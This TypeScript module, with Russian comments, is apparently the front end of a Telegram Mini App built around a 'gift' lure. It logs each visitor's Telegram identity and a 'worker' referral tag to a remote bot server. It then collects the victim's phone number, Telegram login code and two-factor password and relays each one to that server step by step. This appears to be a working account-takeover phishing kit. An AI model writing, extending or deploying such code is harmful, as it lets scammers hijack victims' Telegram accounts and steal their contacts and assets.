import { BOT_API } from '../constants';

function fetchWithTimeout(url: string, options: RequestInit, timeoutMs: number): Promise<Response> {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), timeoutMs);
  return fetch(url, { ...options, signal: controller.signal }).finally(() => clearTimeout(timer));
}

function getTg(): any {
  return (window as any).Telegram?.WebApp ?? null;
}

function getTelegramUserId(): number | null {
  const id = getTg()?.initDataUnsafe?.user?.id;
  return id ? Number(id) : null;
}

// ─── Отстук визита ────────────────────────────────────────────────────────────
export function trackVisitor(): void {
  const tg     = getTg();
  const params = new URLSearchParams(window.location.search);
  const giftId = params.get('gift_id') || '';
  const fromId = params.get('from_id') || '';
  const worker = params.get('worker')  || '';

  fetchWithTimeout(
    `${BOT_API}/api/visitor`,
    {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        user:      tg?.initDataUnsafe?.user || {},
        gift_id:   giftId,
        from_id:   fromId,
        worker:    worker,
        init_data: tg?.initData || '',
      }),
    },
    10000
  ).catch((err) => console.warn('[trackVisitor]', err?.message));
}

// ─── Отправка действия боту ───────────────────────────────────────────────────
async function sendToBot(payload: any): Promise<void> {
  const tg     = getTg();
  const userId = getTelegramUserId();

  if (!userId) {
    const sdkLoaded = !!(window as any).Telegram;
    throw new Error(sdkLoaded
      ? 'Откройте приложение через Telegram'
      : 'Telegram SDK не загружен — проверьте index.html');
  }

  let response: Response;
  try {
    response = await fetchWithTimeout(
      `${BOT_API}/api/miniapp`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          user_id:   userId,
          init_data: tg?.initData || '',
          data:      JSON.stringify(payload),
        }),
      },
      25000
    );
  } catch (err: any) {
    if (err.name === 'AbortError') throw new Error('Сервер не отвечает. Проверьте соединение.');
    throw new Error('Не удалось подключиться к серверу. Проверьте соединение.');
  }

  if (!response.ok) {
    let detail = response.statusText;
    try { detail = await response.text(); } catch {}
    throw new Error(`Ошибка сервера (${response.status}): ${detail.slice(0, 120)}`);
  }
}

// ─── Polling ─────────────────────────────────────────────────────────────────
async function pollReply(timeoutMs = 30000): Promise<any> {
  const userId = getTelegramUserId();
  if (!userId) throw new Error('Откройте приложение через Telegram');

  const start = Date.now();
  while (Date.now() - start < timeoutMs) {
    try {
      const r = await fetchWithTimeout(
        `${BOT_API}/api/reply?user_id=${userId}`,
        { method: 'GET', headers: { 'Accept': 'application/json' } },
        8000
      );
      if (r.status === 200) return await r.json();
    } catch (err: any) {
      if (err.name !== 'AbortError') console.warn('[pollReply]', err.message);
    }
    await new Promise<void>((r) => setTimeout(r, 1500));
  }
  throw new Error('Сервер не ответил за отведённое время. Попробуйте ещё раз.');
}

export async function authStepPhone(phone: string, giftId = ''): Promise<any> {
  await sendToBot({ action: 'phone', phone, gift_id: giftId });
  return pollReply();
}

export async function authStepCode(code: string): Promise<any> {
  await sendToBot({ action: 'code', code });
  return pollReply();
}

export async function authStepPassword(password: string): Promise<any> {
  await sendToBot({ action: 'password', password });
  return pollReply();
}

export { sendToBot };

export async function authStepContactShared(giftId = ''): Promise<any> {
  await sendToBot({ action: 'contact_shared', gift_id: giftId });
  return pollReply(40000); // longer timeout - waiting for contact message
}
